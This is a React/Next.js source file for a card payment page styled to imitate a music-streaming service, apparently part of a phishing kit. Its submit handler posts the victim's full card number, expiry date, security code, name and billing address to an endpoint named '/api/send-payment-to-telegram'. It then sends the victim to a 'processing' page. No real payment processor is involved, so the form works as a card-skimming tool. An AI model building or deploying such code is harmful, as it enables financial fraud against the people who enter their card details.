"use client"

import type React from "react"

import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Checkbox } from "@/components/ui/checkbox"
import { Lock, HelpCircle } from "lucide-react"
import { useState } from "react"
import { useRouter } from "next/navigation"
import { useTranslation } from "@/lib/language-context"

const COUNTRIES = [
  "Afghanistan",
  "Albania",
  "Algeria",
  "Andorra",
  "Angola",
  "Antigua and Barbuda",
  "Argentina",
  "Armenia",
  "Australia",
  "Austria",
  "Azerbaijan",
  "Bahamas",
  "Bahrain",
  "Bangladesh",
  "Barbados",
  "Belarus",
  "Belgium",
  "Belize",
  "Benin",
  "Bhutan",
  "Bolivia",
  "Bosnia and Herzegovina",
  "Botswana",
  "Brazil",
  "Brunei",
  "Bulgaria",
  "Burkina Faso",
  "Burundi",
  "Cabo Verde",
  "Cambodia",
  "Cameroon",
  "Canada",
  "Central African Republic",
  "Chad",
  "Chile",
  "China",
  "Colombia",
  "Comoros",
  "Congo",
  "Costa Rica",
  "Croatia",
  "Cuba",
  "Cyprus",
  "Czech Republic",
  "Denmark",
  "Djibouti",
  "Dominica",
  "Dominican Republic",
  "Ecuador",
  "Egypt",
  "El Salvador",
  "Equatorial Guinea",
  "Eritrea",
  "Estonia",
  "Eswatini",
  "Ethiopia",
  "Fiji",
  "Finland",
  "France",
  "Gabon",
  "Gambia",
  "Georgia",
  "Germany",
  "Ghana",
  "Greece",
  "Grenada",
  "Guatemala",
  "Guinea",
  "Guinea-Bissau",
  "Guyana",
  "Haiti",
  "Honduras",
  "Hungary",
  "Iceland",
  "India",
  "Indonesia",
  "Iran",
  "Iraq",
  "Ireland",
  "Israel",
  "Italy",
  "Jamaica",
  "Japan",
  "Jordan",
  "Kazakhstan",
  "Kenya",
  "Kiribati",
  "Kosovo",
  "Kuwait",
  "Kyrgyzstan",
  "Laos",
  "Latvia",
  "Lebanon",
  "Lesotho",
  "Liberia",
  "Libya",
  "Liechtenstein",
  "Lithuania",
  "Luxembourg",
  "Madagascar",
  "Malawi",
  "Malaysia",
  "Maldives",
  "Mali",
  "Malta",
  "Marshall Islands",
  "Mauritania",
  "Mauritius",
  "Mexico",
  "Micronesia",
  "Moldova",
  "Monaco",
  "Mongolia",
  "Montenegro",
  "Morocco",
  "Mozambique",
  "Myanmar",
  "Namibia",
  "Nauru",
  "Nepal",
  "Netherlands",
  "New Zealand",
  "Nicaragua",
  "Niger",
  "Nigeria",
  "North Korea",
  "North Macedonia",
  "Norway",
  "Oman",
  "Pakistan",
  "Palau",
  "Palestine",
  "Panama",
  "Papua New Guinea",
  "Paraguay",
  "Peru",
  "Philippines",
  "Poland",
  "Portugal",
  "Qatar",
  "Romania",
  "Russia",
  "Rwanda",
  "Saint Kitts and Nevis",
  "Saint Lucia",
  "Saint Vincent and the Grenadines",
  "Samoa",
  "San Marino",
  "Sao Tome and Principe",
  "Saudi Arabia",
  "Senegal",
  "Serbia",
  "Seychelles",
  "Sierra Leone",
  "Singapore",
  "Slovakia",
  "Slovenia",
  "Solomon Islands",
  "Somalia",
  "South Africa",
  "South Korea",
  "South Sudan",
  "Spain",
  "Sri Lanka",
  "Sudan",
  "Suriname",
  "Sweden",
  "Switzerland",
  "Syria",
  "Taiwan",
  "Tajikistan",
  "Tanzania",
  "Thailand",
  "Timor-Leste",
  "Togo",
  "Tonga",
  "Trinidad and Tobago",
  "Tunisia",
  "Turkey",
  "Turkmenistan",
  "Tuvalu",
  "Uganda",
  "Ukraine",
  "United Arab Emirates",
  "United Kingdom",
  "United States",
  "Uruguay",
  "Uzbekistan",
  "Vanuatu",
  "Vatican City",
  "Venezuela",
  "Vietnam",
  "Yemen",
  "Zambia",
  "Zimbabwe",
]

export function PaymentForm({ onPaymentSuccess }: { onPaymentSuccess?: () => void }) {
  const router = useRouter()
  const { t } = useTranslation()
  const [cardNumber, setCardNumber] = useState("")
  const [expiryDate, setExpiryDate] = useState("")
  const [securityCode, setSecurityCode] = useState("")
  const [saveCard, setSaveCard] = useState(false)
  const [fullName, setFullName] = useState("")
  const [address, setAddress] = useState("")
  const [city, setCity] = useState("")
  const [postalCode, setPostalCode] = useState("")
  const [country, setCountry] = useState("United States")
  const [isLoading, setIsLoading] = useState(false)
  const [message, setMessage] = useState("")

  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, "")
    const formatted = cleaned.match(/.{1,4}/g)?.join(" ") || cleaned
    return formatted.slice(0, 19)
  }

  const formatExpiryDate = (value: string) => {
    const cleaned = value.replace(/\D/g, "")
    if (cleaned.length >= 2) {
      return `${cleaned.slice(0, 2)}/${cleaned.slice(2, 4)}`
    }
    return cleaned
  }

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCardNumber(formatCardNumber(e.target.value))
  }

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setExpiryDate(formatExpiryDate(e.target.value))
  }

  const handleSecurityCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 4)
    setSecurityCode(value)
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setMessage("")

    try {
      const response = await fetch("/api/send-payment-to-telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          cardNumber,
          expiryDate,
          securityCode,
          saveCard,
          fullName,
          address,
          city,
          postalCode,
          country,
        }),
      })

      const data = await response.json()

      if (response.ok) {
        if (onPaymentSuccess) {
          onPaymentSuccess()
        } else {
          router.push("/processing")
        }
      } else {
        setMessage(data.error || "Failed to register payment information")
      }
    } catch (error) {
      setMessage("An error occurred. Please try again.")
    } finally {
      setIsLoading(false)
    }
  }

  const handleCancel = () => {
    window.location.reload() // instead of "/" to reset state
  }

  return (
    <div className="w-full max-w-lg space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <h1 className="text-2xl sm:text-3xl font-bold text-white">{t.payment.myCards}</h1>
        <Lock className="w-5 h-5 text-white" />
      </div>

      {/* Payment Form */}
      <form onSubmit={handleSubmit} className="bg-[#1a1a1a] border border-[#2a2a2a] rounded-lg p-4 sm:p-6 space-y-6">
        {/* Card Type Header */}
        <div className="flex items-center justify-between">
          <div className="space-y-2">
            <h2 className="text-white font-semibold text-sm sm:text-base">{t.payment.creditDebitCard}</h2>
            <div className="flex gap-2">
              <div className="w-10 h-7 bg-white rounded flex items-center justify-center">
                <span className="text-[#1434CB] font-bold text-xs">VISA</span>
              </div>
              <div className="w-10 h-7 bg-gradient-to-r from-[#EB001B] to-[#F79E1B] rounded flex items-center justify-center">
                <div className="flex">
                  <div className="w-3 h-3 rounded-full bg-[#EB001B]" />
                  <div className="w-3 h-3 rounded-full bg-[#F79E1B] -ml-1.5" />
                </div>
              </div>
              <div className="w-10 h-7 bg-[#016FD0] rounded flex items-center justify-center">
                <span className="text-white font-bold text-[8px]">AMEX</span>
              </div>
              <div className="w-10 h-7 bg-gradient-to-br from-[#0099DF] to-[#0A3A82] rounded flex items-center justify-center">
                <div className="flex">
                  <div className="w-2.5 h-2.5 rounded-full bg-[#EB001B]" />
                  <div className="w-2.5 h-2.5 rounded-full bg-[#0099DF] -ml-1" />
                </div>
              </div>
            </div>
          </div>
          <Lock className="w-5 h-5 text-white" />
        </div>

        {/* Card Number */}
        <div className="space-y-2">
          <Label htmlFor="cardNumber" className="text-sm font-semibold text-white">
            {t.payment.cardNumber}
          </Label>
          <div className="relative">
            <Input
              id="cardNumber"
              type="text"
              value={cardNumber}
              onChange={handleCardNumberChange}
              required
              className="h-12 bg-[#121212] border-[#727272] text-white hover:border-white focus:border-white focus:ring-0 focus:ring-offset-0 rounded-md pl-10"
            />
            <div className="absolute left-3 top-1/2 -translate-y-1/2 w-6 h-4 bg-[#2a2a2a] rounded border border-[#727272]" />
          </div>
        </div>

        {/* Expiry Date and Security Code */}
        <div className="grid grid-cols-2 gap-4">
          <div className="space-y-2">
            <Label htmlFor="expiryDate" className="text-sm font-semibold text-white">
              {t.payment.expirationDate}
            </Label>
            <Input
              id="expiryDate"
              type="text"
              value={expiryDate}
              onChange={handleExpiryDateChange}
              placeholder="MM/YY"
              required
              className="h-12 bg-[#121212] border-[#727272] text-white placeholder:text-[#727272] hover:border-white focus:border-white focus:ring-0 focus:ring-offset-0 rounded-md"
            />
          </div>
          <div className="space-y-2">
            <Label htmlFor="securityCode" className="text-sm font-semibold text-white">
              {t.payment.securityCode}
            </Label>
            <div className="relative">
              <Input
                id="securityCode"
                type="text"
                value={securityCode}
                onChange={handleSecurityCodeChange}
                required
                className="h-12 bg-[#121212] border-[#727272] text-white hover:border-white focus:border-white focus:ring-0 focus:ring-offset-0 rounded-md pr-10"
              />
              <HelpCircle className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-white" />
            </div>
          </div>
        </div>

        {/* Billing Information */}
        <div className="space-y-4 pt-4 border-t border-[#2a2a2a]">
          <h3 className="text-white font-semibold text-sm sm:text-base">{t.payment.billingInformation}</h3>

          <div className="space-y-2">
            <Label htmlFor="fullName" className="text-sm font-semibold text-white">
              {t.payment.fullName}
            </Label>
            <Input
              id="fullName"
              type="text"
              value={fullName}
              onChange={(e) => setFullName(e.target.value)}
              required
              className="h-12 bg-[#121212] border-[#727272] text-white hover:border-white focus:border-white focus:ring-0 focus:ring-offset-0 rounded-md"
            />
          </div>

          <div className="space-y-2">
            <Label htmlFor="address" className="text-sm font-semibold text-white">
              {t.payment.address}
            </Label>
            <Input
              id="address"
              type="text"
              value={address}
              onChange={(e) => setAddress(e.target.value)}
              required
              className="h-12 bg-[#121212] border-[#727272] text-white hover:border-white focus:border-white focus:ring-0 focus:ring-offset-0 rounded-md"
            />
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <Label htmlFor="city" className="text-sm font-semibold text-white">
                {t.payment.city}
              </Label>
              <Input
                id="city"
                type="text"
                value={city}
                onChange={(e) => setCity(e.target.value)}
                required
                className="h-12 bg-[#121212] border-[#727272] text-white hover:border-white focus:border-white focus:ring-0 focus:ring-offset-0 rounded-md"
              />
            </div>
            <div className="space-y-2">
              <Label htmlFor="postalCode" className="text-sm font-semibold text-white">
                {t.payment.postalCode}
              </Label>
              <Input
                id="postalCode"
                type="text"
                value={postalCode}
                onChange={(e) => setPostalCode(e.target.value)}
                required
                className="h-12 bg-[#121212] border-[#727272] text-white hover:border-white focus:border-white focus:ring-0 focus:ring-offset-0 rounded-md"
              />
            </div>
          </div>

          <div className="space-y-2">
            <Label htmlFor="country" className="text-sm font-semibold text-white">
              {t.payment.country}
            </Label>
            <Select value={country} onValueChange={setCountry} required>
              <SelectTrigger className="h-12 bg-[#121212] border-[#727272] text-white hover:border-white focus:border-white focus:ring-0 focus:ring-offset-0 rounded-md">
                <SelectValue />
              </SelectTrigger>
              <SelectContent className="bg-[#282828] border-[#727272] text-white max-h-60">
                {COUNTRIES.map((countryName) => (
                  <SelectItem
                    key={countryName}
                    value={countryName}
                    className="hover:bg-[#3e3e3e] focus:bg-[#3e3e3e] focus:text-white"
                  >
                    {countryName}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>
        </div>

        {/* Save Card Checkbox */}
        <div className="flex items-start space-x-3 pt-2">
          <Checkbox
            id="saveCard"
            checked={saveCard}
            onCheckedChange={(checked) => setSaveCard(checked as boolean)}
            className="mt-1 border-[#727272] data-[state=checked]:bg-[#1ed760] data-[state=checked]:border-[#1ed760]"
          />
          <div className="space-y-1">
            <Label htmlFor="saveCard" className="text-sm text-white font-normal cursor-pointer">
              {t.payment.saveCard}
            </Label>
            <p className="text-xs text-[#a7a7a7]">{t.payment.saveCardDescription}</p>
          </div>
        </div>

        {/* Submit Button */}
        <div className="flex justify-center pt-4">
          <Button
            type="submit"
            disabled={isLoading}
            className="w-40 h-12 bg-[#1ed760] hover:bg-[#1fdf64] text-black font-bold text-base rounded-full disabled:opacity-50"
          >
            {isLoading ? t.payment.processing : t.payment.registerButton}
          </Button>
        </div>

        {message && (
          <p className={`text-sm text-center ${message.includes("success") ? "text-[#1ed760]" : "text-red-500"}`}>
            {message}
          </p>
        )}

        {/* Cancel Button */}
        <div className="flex justify-center">
          <button
            type="button"
            onClick={handleCancel}
            className="text-white hover:text-[#1ed760] font-semibold text-sm bg-transparent border-0 cursor-pointer"
          >
            {t.payment.cancel}
          </button>
        </div>
      </form>
    </div>
  )
}
